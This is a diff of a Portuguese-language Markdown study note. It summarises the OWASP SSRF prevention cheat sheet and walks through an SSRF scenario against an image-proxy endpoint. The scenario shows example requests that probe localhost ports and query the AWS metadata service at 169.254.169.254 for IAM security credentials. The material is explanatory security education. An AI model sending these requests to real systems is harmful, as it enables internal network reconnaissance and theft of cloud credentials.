@@ -4,8 +4,6 @@
 
 > Tente ler o link a seguir: https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf e me retorne o resumo
 
-
-
 O documento da OWASP intitulado **"Server-Side Request Forgery Prevention Cheat Sheet – SSRF Bible"** é um guia técnico abrangente que detalha as técnicas de ataque SSRF (Server-Side Request Forgery) e fornece orientações práticas para mitigação.
 
 ---
@@ -55,7 +53,7 @@ Para proteger aplicações contra SSRF, o documento sugere:
 
 Para uma leitura detalhada e exemplos práticos, consulte o documento completo: [Server-Side Request Forgery Prevention Cheat Sheet – SSRF Bible (PDF)](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).
 
-Se desejar, posso fornecer exemplos específicos de código ou orientações adicionais sobre como implementar essas medidas em sua aplicação. 
+Se desejar, posso fornecer exemplos específicos de código ou orientações adicionais sobre como implementar essas medidas em sua aplicação.
 
 -- ===============
 -- ===============
@@ -88,14 +86,19 @@ O objetivo inicial era baixar imagens externas e exibir para o usuário. Porém,
 ## 🧨 **Exploração Etapa a Etapa**
 
 ### 1. **Mapeamento da Rede Interna**
+
 O atacante testa URLs internas conhecidas:
+
 ```
 GET /image-proxy?url=http://localhost:8080/
 ```
+
 Se o app exibir uma resposta ou erro diferente de “conexão recusada”, já indica que algo existe ali.
 
 ### 2. **Descoberta de portas e serviços**
+
 Ele começa a variar portas:
+
 ```
 http://127.0.0.1:22/       → SSH
 http://127.0.0.1:3306/     → MySQL
@@ -105,22 +108,28 @@ http://127.0.0.1:5000/     → API interna
 Ao observar a resposta, o atacante pode descobrir que, por exemplo, há uma **API interna de administração rodando em `localhost:5000`**.
 
 ### 3. **Identificação de serviços**
+
 Suponha que `http://localhost:5000/admin` retorne:
+
 ```json
 {
   "status": "ok",
   "admin": true
 }
 ```
+
 Ou até dados de configuração da aplicação.
 
 ### 4. **Exploração de metadados da nuvem (AWS)**
+
 Se o app estiver hospedado na AWS:
+
 ```
 GET /image-proxy?url=http://169.254.169.254/latest/meta-data/
 ```
 
 Pode retornar:
+
 ```
 ami-id
 hostname
@@ -129,9 +138,11 @@ instance-id
 ```
 
 E acessando:
+
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
+
 O atacante pode até obter *chaves temporárias da AWS* usadas pelo servidor — e com isso, executar ações como acessar S3, subir instâncias, etc.
 
 ---
